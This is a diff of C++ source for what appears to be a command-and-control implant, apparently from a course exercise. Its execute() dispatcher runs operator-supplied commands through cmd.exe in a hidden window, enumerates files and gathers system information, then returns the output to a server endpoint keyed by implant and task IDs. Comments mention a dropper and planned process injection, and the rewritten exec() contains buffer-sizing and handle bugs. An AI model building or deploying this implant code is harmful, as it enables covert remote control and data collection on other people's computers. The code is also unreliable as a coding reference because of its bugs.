@@ -7,15 +7,10 @@
 - Execution <arg>
 - File Enumeration <arg> - List files in the directory
 
-In the works
-- Dropper [Current version runs]
-I cannot for the life of me get the Dropper header to run in the execute header file
-
 TODO:
 - Retrieval - Is commented out?
 - Injection - Will work on it next time
  */
-
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
     std::string results;
@@ -33,16 +28,14 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     /* Situational Awareness */
     if(command.compare("SituationalAwareness") == 0){
         printf("Executing Situational Awareness\n");
-        results = GetAll();
+        json results_parse = GetAll();
+       // results = results_parse.at(0).at(2);
         HttpResponse("/response_json", implant_id, task_id, results, "success", command);
     }
 
     /* Execution */
     if(command.compare("Execution") == 0){
         printf("Executing Execution\n");
-        /* I have not double-checked this code
-        I grabbed this from our previous patch of code and I'm just
-        grabbing the response*/
 
         // //split on space
         // int i = args.find(" ");
@@ -54,10 +47,20 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         // for (int k = i; k < args.size(); k++){
         //     a[k] = args[k];
         // }
-        std::string res = exec("C:\\Windows\\System32\\cmd.exe /c",args);
+        char* c = strcpy(new char[args.length() + 1], args.c_str());
+        std::string duh = "C:/Windows/System32/cmd.exe /c";
+        char* k = strcpy(new char[duh.length() + 1], duh.c_str());
+        std::string res = exec(k,c);
             
+
         results = res;
+        results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
+        results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
+        std::replace( results.begin(), results.end(), '\\', '/');
+        std::replace( results.begin(), results.end(), '-', '_');
         HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        //std::cout << res << std::endl;
+        //std::cout << HttpResponse("/response_json", implant_id, task_id, results, "success", command) << std::endl;
     }
     
     /* File Enumeration */
@@ -78,7 +81,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         std::string result = storage.str();
             //std::cout << result << std::endl;
             //std::string item = 
-        HttpResponse("/response_json", implant_id, task_id, result, "success", command);
+        std::cout << HttpResponse("/response_json", implant_id, task_id, result, "success", command) << std::endl;
             //std::cout << item;
     }
 
@@ -120,131 +123,78 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
 
 std::string exec(char* program, char* args){
-    int cmdLen = strlen(program) + strlen(args);
-
-    LPSTR parsedCmds = (char *)malloc((cmdLen + 16) * sizeof(char));
-    if (parsedCmds == NULL)
-    {
-        printf("Error allocating memory");
-        return std::string("");
-    }
-
-    // Used these docs to understand sprintf https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2013/ybk95axf(v=vs.120)
-    int j;
-    j = sprintf(parsedCmds, program);
-    j += sprintf(parsedCmds + j, " ");
-    j += sprintf(parsedCmds + j, args);
-    j += sprintf(parsedCmds + j, "\0");
-    // Declare handles for StdOut
+  
+   LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
+    + 50);
+    sprintf(cmd, "cmd.exe /c %s", args);
     HANDLE hStdOutRead, hStdOutWrite;
+
+    hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
+    if ((hStdOutRead == INVALID_HANDLE_VALUE) || (hStdOutWrite == INVALID_HANDLE_VALUE))
+        return FALSE;
+
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
-    // Prevent dead squirrels
-    ZeroMemory(&pi, sizeof(pi));
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    // TODO: Set si.dwFlags...
-    // HINT Read this and look for anything that talks about handle inheritance :-)
-    //  https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
-
-    // //your solution here!
-    si.dwFlags |= STARTF_USESTDHANDLES;
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
-
-    // TODO: ensure that the child processes can inherit our handles!
-    // //your solution here!
     sa.bInheritHandle = TRUE;
-
-    // TODO: Create a pipe  object and share the handle with a child processes
-    // //your solution here!
-
-    if (!CreatePipe(
-            &hStdOutRead,
-            &hStdOutWrite,
-            &sa,
-            0))
-    {
-        printf("CreatePipe Failed");
-        printf("%d", GetLastError());
-        return std::string("");
+    ZeroMemory(&pi, sizeof(pi));
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    
+    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
+        printf("error creating pipe");
+        return FALSE;
     }
-
-    if (!SetHandleInformation(hStdOutRead, 0x00000001, 0))
-    {
-        printf("Failed to set handle information for hStdOutRead");
-        return std::string("");
-    }
-    // TODO: Set
-    // set startupinfo handles
+    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
+    si.dwFlags |= STARTF_USESTDHANDLES;
     si.hStdInput = NULL;
-    si.hStdError = hStdOutRead;
+    si.hStdError = hStdOutWrite;
     si.hStdOutput = hStdOutWrite;
+    BOOL creationResult = CreateProcessA(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        TRUE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+    std::string output;
+    if (creationResult){
+        LPVOID buffer[4096];
+        DWORD bytesAvail = 0, bytesRead = 0;
+        do {
+            do {
+            ZeroMemory(buffer, 4096);
+            if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL)) {
+                printf("error peeking at pipe");
+                return "";
+            }
 
-    // Create the child Processes and wait for it to terminate!
-    // //your solution here!
-
-    if (!CreateProcessA(
-            NULL,
-            parsedCmds,
-            &sa,
-            &sa,
-            TRUE,
-            0,
-            NULL,
-            NULL,
-            &si,
-            &pi))
-    {
-        printf("Failed CreateProcessA\n");
-        printf("%d", GetLastError());
-        return std::string("");
+            if (bytesAvail) {
+                if (!ReadFile(hStdOutRead, buffer, 4095, &bytesRead, NULL)) {
+                    printf("error reading pipe");
+                    return "";
+                }
+                if (bytesRead) {
+                     char *charData = (char*)buffer;
+                    output = std::string(charData);
+                    
+                    //printf("%s", buffer);
+                }
+            }
+        } while (bytesAvail != 0);
+    } while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        CloseHandle(hStdOutRead);
+        CloseHandle(hStdOutWrite);
     }
-
-    char *buffer = (char *)malloc(BUF_SIZE);
-    DWORD totalBytesAvail;
-    LPDWORD lpTotalBytesAvail = &totalBytesAvail;
-    DWORD bytesRead;
-    LPDWORD lpBytesRead = &bytesRead;
-    DWORD exitCode;
-    LPDWORD lpExitCode = &exitCode;
-   
-    while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
-    {
-        PeekNamedPipe(
-            hStdOutRead,
-            NULL,
-            0,
-            NULL,
-            lpTotalBytesAvail,
-            NULL);
-
-        while (*lpTotalBytesAvail > 0)
-        {
-            ReadFile(
-                hStdOutRead,
-                buffer,
-                BUF_SIZE,
-                lpBytesRead,
-                NULL);
-
-            //printf(buffer);
-
-            *lpTotalBytesAvail = *lpTotalBytesAvail - *lpBytesRead;
-        }
-
-
-    }
-
-
-    // TODO: perform any cleanup necessary!
-    // The parent processes no longer needs a handle to the child processes, the running thread, or the out file!
-    // //your solution here!
-    CloseHandle(hStdOutRead);
-    CloseHandle(hStdOutWrite);
-    CloseHandle(hStdOutRead);
-    CloseHandle(hStdOutWrite);
-    free(parsedCmds);
-    return std::string(buffer);
+    
+    return output;
 }
